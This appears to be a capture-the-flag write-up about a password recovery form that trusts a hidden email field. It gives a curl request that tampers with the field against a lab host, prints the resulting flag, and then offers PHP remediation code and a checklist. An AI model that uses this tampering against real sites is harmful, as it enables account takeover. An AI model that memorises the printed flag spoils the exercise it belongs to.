# Password Recovery Form Vulnerability

## 🎯 Overview
This vulnerability demonstrates an insecure password recovery implementation where the application fails to properly validate email addresses and relies on client-side hidden form fields for sensitive operations.

## 🔍 Vulnerability Details
- **Endpoint**: `/index.php?page=recover`
- **Parameter**: `mail` (hidden form field)
- **Method**: POST
- **Attack Vector**: Hidden Form Field Manipulation

## ⚔️ Exploitation Process

### 1. Vulnerability Discovery
- Located password recovery form
- Inspected HTML source
- Found hidden email field: `<input type="hidden" name="mail" value="example@mail.com">`

### 2. Attack Method
```bash
# Exploit using cURL to modify hidden mail parameter
curl 'http://x.x.x.x/?page=recover#' \
  --data 'mail=marvin@42.fr&Submit=Submit' \
  | grep 'The flag is'
```

### Attack Result
**Flag**: 1d4855f7337c0c14b6f44946872c4eb33853f40b2d54393fbe94f49f1e19bbb0

## 🛡️ Security Issues Identified
1. Client-side email validation
2. Hidden form field for sensitive data
3. No server-side validation
4. Weak access controls
5. Insecure password recovery flow

## 🔒 Recommended Security Fixes

### 1. Implement Secure Password Recovery
```php
function initiatePasswordReset($email) {
    // Verify user exists
    if (!userExists($email)) {
        return genericError();
    }
    
    // Generate secure token
    $token = bin2hex(random_bytes(32));
    
    // Store token with expiration
    storeResetToken($email, $token, time() + 3600);
    
    // Send reset email
    sendResetEmail($email, $token);
}
```

### 2. Security Measures Checklist
- [ ] Implement server-side validation
- [ ] Use secure token generation
- [ ] Set token expiration
- [ ] Rate limit reset attempts
- [ ] Log recovery attempts
- [ ] Implement account lockout
- [ ] Use secure email templates

### 3. Secure Reset Flow Implementation
```php
// Example secure reset flow
class PasswordReset {
    public function handleResetRequest($email) {
        // Rate limiting
        if ($this->isRateLimited($email)) {
            throw new Exception('Too many attempts');
        }
        
        // Verify user exists but don't reveal this info
        $user = $this->findUser($email);
        if ($user) {
            $token = $this->generateSecureToken();
            $this->storeResetAttempt($email, $token);
            $this->sendResetEmail($email, $token);
        }
        
        // Always return generic message
        return 'If an account exists, instructions have been sent';
    }
}
```

## 📝 Best Practices

### Password Reset Email Template
```html
<p>Hello,</p>
<p>A password reset was requested for your account. 
   If you did not request this, please ignore this email.</p>
<p>Click the link below to reset your password 
   (valid for 1 hour):</p>
<a href="https://example.com/reset?token={{secure_token}}">
    Reset Password
</a>
```

## 📚 Additional Resources
- [OWASP Password Reset Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Forgot_Password_Cheat_Sheet.html)
- [NIST Digital Identity Guidelines](https://pages.nist.gov/800-63-3/)
- [Troy Hunt: Everything you ever wanted to know about building a secure password reset feature](https://www.troyhunt.com/everything-you-ever-wanted-to-know/)

## ⚠️ Disclaimer
This documentation is for educational purposes only. Always obtain proper authorization before testing security measures on any system.